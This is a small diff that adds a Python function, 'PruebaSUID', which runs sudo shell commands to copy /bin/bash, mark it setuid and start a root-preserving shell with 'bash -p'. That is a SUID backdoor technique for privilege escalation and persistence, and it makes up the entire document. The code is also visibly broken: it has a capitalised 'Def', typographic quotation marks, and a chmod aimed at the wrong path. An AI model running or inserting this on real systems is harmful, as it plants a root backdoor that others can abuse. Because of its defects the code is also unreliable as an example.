@@ -1,0 +1,9 @@
+Def PruebaSUID():
+  import os
+  Com1 = ‘sudo cp -rp /bin/bash /home/user3files’
+  Com2 = ‘sudo chmod u+s bash’
+  Com3 = ‘./bash -p’
+  os.system(Com1)
+  os.system(Com2)
+  os.system(Com3)
+PruebaSUID()
